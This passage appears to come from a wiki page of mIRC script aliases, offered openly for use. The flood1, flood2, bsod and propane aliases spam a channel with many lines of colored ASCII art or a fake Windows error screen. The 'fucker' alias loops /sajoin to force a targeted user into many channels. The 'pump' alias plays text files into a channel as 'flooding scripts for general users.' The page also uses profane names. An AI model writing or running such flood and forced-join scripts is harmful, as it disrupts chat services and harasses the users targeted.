  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xx�10,10xxxxxxxx�14,14xxxxxx�10,10xx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xxxx�10,10xxxxxx�14,14xxxxxx�10,10xx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xxxx�10,10xxxxxx�14,14xxxx�10,10xxxx�9,9xxxxxxxxxxxxxxxxxx�
  /msg $chan �9,9xxxxxxxxxxxxxxxx�10,10xxxxxxxxxx�14,14xxxx�10,10xxxxxx�14,14xxxx�10,10xx�9,9xxxxxxxxxxxxxxxxxxxx�
}
alias bsod {
  /msg $chan �12,12__________________________________________________________________�
  /msg $chan �12,12__________________�12,15 Windows Protection Error �12,12______________________�
  /msg $chan �12,12_____�0,12A fatal exception 0E has occured at jeet/VXD:42445D1L94C4 �12,12___�
  /msg $chan �12,12_____�0,12the current application will be terminated.�12,12__________________�
  /msg $chan �12,12__________________________________________________________________�
  /msg $chan �12,12_____�0,12* Press any key to terminate the current application.�12,12________�
  /msg $chan �12,12_____�0,12* Press CTRL+ALT+DEL again to restart your computer�12,12__________�
  /msg $chan �12,12_____�0,12You will lose any unsaved infomation in all applications.�12,12____�
  /msg $chan �12,12__________________________________________________________________�
  /msg $chan �12,12__________________�0,12Press any key to continue�12,12_______________________�
  /msg $chan �12,12__________________________________________________________________�
}

alias propane {
  /msg $chan â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–„â–‘â–ˆâ–‘â–ˆâ–€â–€â–‘â–‘�
  /msg $chan â–ˆâ–€â–€â–‘â–ˆâ–€â–„â–‘â–ˆâ–‘â–ˆâ–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–ˆâ–ˆâ–‘â–ˆâ–€â–‘â–‘â–‘�
  /msg $chan â–€â–‘â–‘â–‘â–€â–‘â–€â–‘â–€â–€â–€â–‘â–€â–‘â–‘â–‘â–€â–‘â–€â–‘â–€â–‘â–‘â–€â–‘â–€â–€â–€â–‘â–€�
}
alias flood1 {
  /msg $chan (¯`·.¸¸.·´¯`·.¸¸.-> $1- <-.¸¸.·´¯`·.¸¸.·´¯)
  /msg $chan _¸,.»¬=æ¤º²°`¯ ¯`°²º¤æ=¬«.,¸. $1- _¸,.»¬=æ¤º²°`¯ ¯`°²º¤æ=¬«.,¸.
  /msg $chan ©º°¨¨°º© $1- ©º°¨¨°º©
  /msg $chan ¯°·.¸¸.·°¯°·.¸¸.·°¯°·.¸¸.-> $1- <-.¸¸.·°¯°·.¸¸.·°¯°·.¸¸.·°¯
  /msg $chan .(¯`·.¸(¯`·.¸(¯`·.¸(¯`·.¸ $1- ¸.·´¯)¸.·´¯)¸.·´¯)¸.·´¯)
  /msg $chan §¤*~`~*¤§|§¤*~`~*¤§|§¤*~ -==- $1- -==- ~*¤§|§¤*~`~*¤§|§¤*~`~*¤§
  /msg $chan ,ø¤°`°¤ø,¸_¸,ø¤°`°¤ø,¸_¸,ø¤ $1- ¤ø,¸_¸,ø¤°`°¤ø,¸_¸,ø¤°`°¤ø,
  /msg $chan ¨¨°º©o¿,,¿o©º°¨¨°º© $1- ©º°¨¨°º©o¿,,¿o©º°
  /msg $chan _¸,.»¬=æ¤º²°`¯ ¯`°²º¤æ-+++--->>> $1- <<<---+++-æ¤º²°´¯ ¯´°²º¤æ=¬».,¸_
  /msg $chan -: ¸,+°´°+,¸,+°´°+,¸ �� - $1- - �� ,+°´°+°´°+,¸,+°´°+,
  /msg $chan ²º¤æ=¬«.,¸_¸,.»¬=æ¤º²°` $1- `°²º¤æ=¬«.,¸_¸,.»¬=æ¤º²°`
  /msg $chan .,-*'^'*-,._.,-*'^'*-,._.,-*~> $1- <~*-,._.,-*'^'*-,._.,-*'^'*-,.
  /msg $chan "_¸,.»¬=æ¤º²°`¯ ¯`°²º¤æ- $1- -=æ¤º²°`¯ ¯`°²º¤æ=¬«.,¸."
  /msg $chan ¨¨°º©o¿,,¿o©º°¨¨°º© $1- ©º°¨¨°º©o¿,,¿o©º°
  /msg $chan _-¯-_-¯-_-¯-_-¯-_-¯-_-> $1- <-_-¯-_-¯-_-¯-_-¯-_-¯-_
  /msg $chan ¡!¹'¹!¡!¹'¹!¡!¹'¹!¡!¹'¹!¡!¹'¹!¡» $1- «¡!¹'¹!¡!¹'¹!¡!¹'¹!¡!¹'¹!¡!¹'¹!¡
  /msg $chan ,ø¤°`°¤ø,¸ ¸,ø¤°`°¤ø,¸ $1- ¸,ø¤°`°¤ø,¸ ¸,ø¤°`°¤ø,¸
  /msg $chan _,.-'~'-.,_,.-'~'-.,_,.-'~'- $1- -'~'-.,_,.-'~'-.,_,.-'~'-.,_
  /msg $chan `·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.-> $1- <-.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯
  /msg $chan ._.-¤º••¶Þ••º¤-_±_.-¤º••¶Þ••º¤-_±{ $1- }±_.-¤º••¶Þ••º¤-_±_.-¤º••¶Þ••º¤-_
  /msg $chan ~°²­«,¸_¸,»-²°~^~°²­«,¸_ $1-  _¸,»-²°~^~°²­«,¸_¸,»-²°~
}

alias flood2 {
  /msg $chan �0,8%¸�8,8�7,8`%�8,7%¸�7,7�4,7`%�7,4%¸�4,4�5,4`%�4,5%¸�5,5�1,5`%�5,1%�9,1� $1- �5,1`%�1,5%¸�5,5�4,5`%�5,4%¸�4,4�7,4`%�4,7%, �8,7`%�7,8%, �0`
  /msg $chan �8,0|�0,8|�7,8|�8,7|�4,7|�7,4|�5,4|�4,5|�1,5|�5,1| �9,1 $1-  �5,1 |�1,5|�4,5|�5,4|�7,4|�4,7|�8,7|�7,8|
  /msg $chan �0,0%�11,0%�0,11%�11,11%�10,12%�12,12%�2,12%�12,2%�2,2%�1,2%�2,1%�1,1% �13,1� $1- �2,1%�1,2%�2,2%�12,2%�2,12%�12,12%�10,12%�0,11%�11,0%�0,0%
  /msg $chan �15,0¦|�0,15¦|�14,15¦|�15,14¦|�1,14¦|�14,1¦|�9,1� $1- �14,1|¦�1,14|¦�15,14|¦�14,15|¦�0,15|¦�15,0|¦
  /msg $chan ��9,0æ�0,9æ�3,9æ�9,3æ�1,3æ�3,1æ �9,1  $1- 3,1æ�1,3æ�9,3æ�3,9æ�0,9æ�9,0æ�.
  /msg $chan �3,1\��1,3\��9,3\��3,9\��0,9\��9,0\��0,0-��15,0\��0,15\��14,15\�15,14\��1,14\�14,1\�1,1-��0,1 $1- ��1,1-��14,1/��1,14/��15,14/��14,15/��0,15/�15,0/��0,0-��9,0/��0,9/��3,9/��9,3/��1,3/��3,1/�0,0� 
  /msg $chan ��0,15%,�14`%�15,14%,�1`%�14,1%,��15,1 $1-  �14,1`%�1,14%,�15`%�14,15%,�0`%�3,0
  /msg $chan ��13,0<�0,13>�6,13<�13,6>�2,6<�6,2>�1,2<�2,1>�0,1 $1- ��2,1<�1,2>�6,2<�2,6>�13,6<�6,13>�0,13<�13,0>�
  /msg $chan �9`%�16,9%,  �3,9`%�9,3%,  �1,3`%�3,1%,�16,1 $1- �3,1`%�1,3%,  �9,3`%�3,9%,  �16,9`%�9,16%, �1     
  /msg $chan �15,0,%�0,15%`�13,15,%�15,13%`�6,13,%�13,6%`�5,6,% �8 $1- �5,6%,�13,6`%�6,13%,�15,13`%�13,15%,�0,15`%�15,0%,
  /msg $chan �11,0%�0,11% �10,11%�11,10% �2,10%�10,2% �1,2%�2,1%�0,1 � $1- � �2,1%�1,2% �10,2%�2,10% �11,10%�10,11% �0,11%�11,0%�
  /msg $chan �16,15%,�14,15`%�15,14%,�10,14`%�14,10%,�2,10`%�10,2%,��15,2  $1- ��10,2`%�2,10%,�14,10`%�10,14%,�15,14`%�14,15�16,15�14,15`% �16,15%,
  /msg $chan �8,0 ,%�0,8%`�7,8,%�8,7%`�4,7,%�7,4%`�8,4 $1- �7,4`%�4,7%,�8,7`%�7,8%,�0,8`%�8,0%, �
  /msg $chan �12��15,8%�8,8�|��4,8%�8,4%�4,4|�5,4%�4,5%�5,5|�1,5%�5,1%�1-- �16 $1- �1--�5,1%�1,5%�5,5|�4,5%�5,4%�4,4��|�8,4%��4,8%�8,8��|�15,8%�1
  /msg $chan �4,0%��0,4%��4,4 ��5,4%��4,5%��5,5 ��1,5%��5,1%��1,1 ��15,1 $1- ��5,1%��1,5%��5,5 ��4,5%��5,4%��4,4 ��0,4%��4,0%� 
  /msg $chan �8,0|�0,8|�7,8|�8,7|�4,7|�7,4|�5,4|�4,5|�1,5|�5,1| �9,1 $1- �5,1 |�1,5|�4,5|�5,4|�7,4|�4,7|�8,7|�7,8|
  /msg $chan �8,1®�8,14®�8,15®�8,0®�8,15®�8,14®�8,1®� �0 $1-  ��8,1®�8,14®�8,15®�8,0®�8,15®�8,14®�8,1®
  /msg $chan �3,1\��1,3\��9,3\��3,9\��0,9\��9,0\��0,0-��15,0\��0,15\��14,15\�15,14\��1,14\�14,1\�1,1-��0,1 $1- ��1,1-��14,1/��1,14/��15,14/��14,15/��0,15/�15,0/��0,0-��9,0/��0,9/��3,9/��9,3/��1,3/��3,1/�0,0�
  /msg $chan ��8,6¯�0`°²º�4¤�8æ=¬�0«.,¸�8_��0,6 $1- ��8,6_¸,.�0»¬=�8æ�4¤�0º²°`�8¯
  /msg $chan ��15/�0,15/�15,14/�14,1/�0,1 $1- �14,1\�15,14\�0,15\�15,0\
  /msg $chan �1,1�1,2�1,3�1,4�1,5�1,6�1,7�1,8�1,9�1,10�8,1�  $1-  ��1,10�1,9�1,8�1,7�1,6�1,5�1,4�1,3�1,2�1
  /msg $chan ��2{�3{�4{�5{�6{�7{�8{�9{�10{�11{�12{�13{�14{�15{�2{�3{�4{�5{�6{�7{�8{�9{�10{�11{�12{�13{�14{�15{�1 $1- �15}�14}�13}�12}�11}�10}�9}�8}�7}�6}�5}�4}�3}�2}�15}�14}�13}�12}�11}�10}�9}�8}�7}�6}�5}�4}�3}�2
}
</pre>


#### fucker ####

The simple mIRC version of fuckyou.pl

##### The Codes #####

<pre>
;;FUCKER SCRIPT
;;/fucker <nickname> <how many joins>

alias fucker {
  var %fucker = 1
  var %fucking = $1
  while (%fucker <= $2) {
    /sajoin %fucking $+($chr(35), 1, %fucker));
    inc %fucker
  }
}
</pre>


#### pump ####

Assorted flooding scripts for general users.

##### The Codes #####

<pre>;Create a texts folder under your mirc directory
;Copy art to texts folder
;Make sure the art extension is named .txt
;Usage /pump blah
;PROFIT

alias pump {
  /play $+(texts\, $1, .txt) 0
  /play
}
</pre>


